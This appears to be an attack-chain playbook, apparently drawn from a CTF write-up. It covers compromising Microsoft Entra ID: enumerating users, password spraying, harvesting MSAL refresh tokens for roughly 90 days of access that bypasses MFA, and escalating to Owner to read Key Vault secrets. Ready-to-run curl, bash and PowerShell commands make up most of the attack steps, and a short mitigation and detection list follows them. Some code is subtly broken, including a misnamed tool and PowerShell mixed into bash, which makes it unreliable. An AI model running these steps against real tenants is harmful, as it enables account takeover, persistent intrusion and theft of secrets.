# Azure Credential Spray to Refresh Token Persistence

## Chain Summary
**Entry Point:** Entra ID user enumeration with no MFA  
**Severity:** High  
**Source:** https://kabinet.gitbook.io/ctf-writeup/2025/thuderdome/an-absent-defense

Exploits MFA gaps in Entra ID by spraying credentials, then extracting MSAL refresh tokens for 90-day persistent access without re-authentication. Bypasses MFA requirements by abusing token issuance for non-MFA-protected endpoints.

---

## Chain: UPN Spray (No MFA) → Valid Creds → MSAL Refresh Token Extraction → 90-Day Persistence

### [1] Entra ID User Enumeration (UPN Harvesting)
- **Trigger:** Target company domain known; no advanced Entra ID protections active; need target userlist for spray
- **Prereq:** Target domain; email list from LinkedIn, domain registration, or public records
- **Method:**
  ```bash
  # Tool: MSPaint, Kerbrute, or manual curl spray
  # Enumerate valid UPNs via Entra ID response timing / redirect codes
  # Approach 1: getuserrealm endpoint (unauthenticated)
  for user in $(cat userlist.txt); do
    echo "Testing $user..."
    curl -s 'https://login.microsoftonline.com/getuserrealm.srf?login='"$user"'&xml=1' \
      | grep -q "NameSpaceType" && echo "$user EXISTS" >> valid_upns.txt
  done
  
  # Approach 2: o365userfinder or similar tool
  python3 o365userfinder.py -u userlist.txt -d target.com 2>/dev/null | grep -E "^\[.*\] VALID"
  ```
- **Yields:** List of valid UPNs for the target organization (valid_upns.txt)

### [2] Credential Spray (MSOLSpray) — Targeting Accounts Without MFA
- **Trigger:** Valid UPN list in hand; known weak password (e.g., `Welcome2025!`, `P@ssw0rd123`) or previously breached password list; MFA NOT enforced tenant-wide
- **Prereq:** UPN list; password dictionary; MSOLSpray or equivalent spray tool; target Entra ID has accounts without MFA enabled
- **Method:**
  ```bash
  # Tool: MSOLSpray
  python3 MSOLSpray.py -U valid_upns.txt -P passwords.txt -o spray_results.txt
  
  # Or manual curl spray (slower but flexible)
  for user in $(cat valid_upns.txt); do
    for pass in $(cat passwords.txt); do
      response=$(curl -s -X POST "https://login.microsoftonline.com/common/oauth2/token" \
        -d "grant_type=password" \
        -d "username=$user" \
        -d "password=$pass" \
        -d "client_id=d3590ed6-52b3-4102-aedd-a47eb6b5b65d" \
        -d "scope=https://graph.microsoft.com/.default" \
        2>&1)
      
      if echo "$response" | jq -e '.access_token' >/dev/null 2>&1; then
        echo "[+] VALID: $user:$pass" | tee -a spray_results.txt
        break  # Move to next user
      fi
    done
  done
  ```
- **Yields:** Valid Entra ID credentials (UPN + password) for accounts without MFA protection

### [3] az CLI Login with Compromised Credentials
- **Trigger:** Valid credentials obtained; need to authenticate to Azure ecosystem
- **Prereq:** `az` CLI installed; valid UPN + password; MFA NOT required for the account
- **Method:**
  ```bash
  # Login with compromised credentials
  az login -u <COMPROMISED_UPN> -p <PASSWORD>
  
  # Verify authentication
  az account show  # Displays current account info
  ```
- **Yields:** Authenticated `az` CLI session; credentials cached in local Azure CLI token cache

### [4] MSAL Token Extraction (Refresh Token Harvesting)
- **Trigger:** `az` CLI authenticated; need long-term persistence tokens
- **Prereq:** Authenticated az CLI session; access to token cache directory (~/.azure/msal_token_cache.json or equivalent); jq for JSON parsing
- **Method:**
  ```bash
  # Locate MSAL token cache
  ls -la ~/.azure/
  cat ~/.azure/msal_token_cache.json | jq . > /tmp/tokens.json
  
  # Extract refresh token (persists ~90 days)
  REFRESH_TOKEN=$(cat ~/.azure/msal_token_cache.json | jq -r '.RefreshToken[0].secret')
  echo "Refresh Token: $REFRESH_TOKEN"
  
  # Also extract access token for immediate use
  ACCESS_TOKEN=$(cat ~/.azure/msal_token_cache.json | jq -r '.AccessToken[0].secret')
  echo "Access Token: $ACCESS_TOKEN"
  ```
- **Yields:** Refresh token (valid ~90 days, survives password resets if refresh token not revoked) and access token (valid ~60 min)

### [5] Token Persistence and Offline Use
- **Trigger:** Refresh token extracted; attacker wants durable access
- **Prereq:** Refresh token; ability to store it securely; Azure PowerShell or direct Graph API access needed for token refresh
- **Method:**
  ```bash
  # Store refresh token securely for later use
  echo "$REFRESH_TOKEN" > /secure/location/azure_refresh.tok
  
  # Later, refresh the token to get new access token (bypasses password requirement and MFA)
  # Using Azure PowerShell
  $token = @{
    grant_type    = "refresh_token"
    client_id     = "d3590ed6-52b3-4102-aedd-a47eb6b5b65d"  # Azure CLI client
    refresh_token = $REFRESH_TOKEN
    scope         = "https://management.azure.com/.default offline_access"
  }
  
  $response = Invoke-RestMethod -Method Post \
    -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/token" \
    -Body $token
  
  $newAccessToken = $response.access_token
  $newRefreshToken = $response.refresh_token  # May be rotated
  
  # Or via curl
  curl -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/token" \
    -d "grant_type=refresh_token" \
    -d "client_id=d3590ed6-52b3-4102-aedd-a47eb6b5b65d" \
    -d "refresh_token=$REFRESH_TOKEN" \
    -d "scope=https://management.azure.com/.default offline_access"
  ```
- **Yields:** New access token valid for 60 minutes; potentially refreshed refresh token (extends persistence window); no re-authentication or MFA prompt required

### [6] Lateral Movement & Privilege Escalation (Post-Persistence)
- **Trigger:** Refresh token persisted; need to escalate or move within Azure environment
- **Prereq:** Refresh token; ability to use Azure CLI or Graph API; target resources identifiable
- **Method:**
  ```bash
  # Use persisted refresh token to re-authenticate
  export AZURE_REFRESH_TOKEN="<stored_refresh_token>"
  
  # Enumerate subscriptions, resource groups, roles
  az account list
  az group list --subscription <SUB_ID>
  az role assignment list --query "[].{Principal:principalName, Role:roleDefinitionName}"
  
  # Attempt privilege escalation (e.g., if user has User Access Administrator)
  az role assignment create --role "Owner" --assignee-object-id <MY_OBJECT_ID> --scope "/subscriptions/<SUB_ID>"
  
  # Access Key Vault secrets
  az keyvault secret list --vault-name <VAULT_NAME>
  az keyvault secret show --vault-name <VAULT_NAME> --name <SECRET_NAME> --query value -o tsv
  ```
- **Yields:** Escalated access; credential exfiltration; resource enumeration

---

## Mitigation & Detection

**Prevention:**
- **Enforce MFA tenant-wide** — no exceptions for internal IPs or trusted networks
- **Conditional Access Policies:** Block sign-ins from unknown locations, high-risk sign-ins
- **Monitor spray attacks:** Alert on failed logins from same source IP targeting multiple users
- **Rotate credentials regularly** and monitor for reuse of old passwords
- **Token management:** Set refresh token max age via Conditional Access; reduce to <7 days if possible
- **Azure AD Sign-In Risk Policies:** Enable risky sign-in detection and block / require MFA
- **Use Windows Hello for Business** or hardware security keys instead of passwords + MFA

**Detection:**
- **Azure AD Sign-In Logs:** Alert on successful auth from impossible travel, unusual locations, or spike in failed attempts
- **MSAL Token Cache Access:** Monitor for unauthorized reads of `~/.azure/msal_token_cache.json`
- **Refresh Token Issuance:** Alert on large number of token refresh requests outside normal patterns
- **Conditional Access Analytics:** Review MFA bypass events (CA policies that excluded users)
- **Log Analytics / Kusto queries:** Detect multiple UPNs from single source IP, or single UPN with multiple failed attempts followed by success

---

## References
- Entra ID Sign-In Logs: https://learn.microsoft.com/en-us/azure/active-directory/reports-monitoring/overview-sign-ins
- MSAL Refresh Tokens: https://learn.microsoft.com/en-us/azure/active-directory/develop/access-tokens
- Conditional Access: https://learn.microsoft.com/en-us/azure/active-directory/conditional-access/overview
- MFA in Entra ID: https://learn.microsoft.com/en-us/azure/active-directory/authentication/concept-mfa-howitworks
